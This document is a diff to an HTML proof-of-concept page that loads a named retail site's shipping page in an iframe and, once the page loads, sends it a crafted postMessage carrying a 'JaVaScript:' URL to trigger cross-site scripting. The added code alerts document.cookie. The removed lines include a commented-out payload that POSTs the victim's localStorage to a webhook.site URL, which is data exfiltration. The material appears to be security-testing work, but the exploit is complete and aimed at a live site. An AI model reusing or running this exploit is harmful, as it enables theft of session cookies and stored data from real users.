@@ -13,17 +13,22 @@
 </head>
 <body>
     <h2>Parent Page</h2>
-    <button id="sendMessageBtn">Send Message to Iframe</button>
     <iframe id="myIframe" src="https://eur.halara.com/pages/shipping-customs?sa-visual-mode=true" name="myIframe"></iframe>
 
     <script>
-        // document.getElementById('sendMessageBtn').click = function() {
+        window.addEventListener('load', function() {
             const iframe = document.getElementById('myIframe');
             setTimeout(() => {
-                iframe.contentWindow.postMessage({source:"sa-fe",type:"v-track-mode",data:{isVtrack:true,userURL:"JaVaScript:alert(JSON.stringify(localStorage))"}},"*")
+                iframe.contentWindow.postMessage({
+                    source: "sa-fe",
+                    type: "v-track-mode",
+                    data: {
+                        isVtrack: true,
+                        userURL: "JaVaScript:alert(document.cookie)"
+                    }
+                }, "*");
             }, 1500);
-        // };
-        // iframe.contentWindow.postMessage({source:"sa-fe",type:"v-track-mode",data:{isVtrack:true,userURL:"JaVaScript:fetch('https://webhook.site/d699ea0b-e69e-44af-88bf-03cd8d40bebb/exfil',{method:'POST',body:JSON.stringify(localStorage)})"}},"*")
+        });
     </script>
 </body>
 </html>
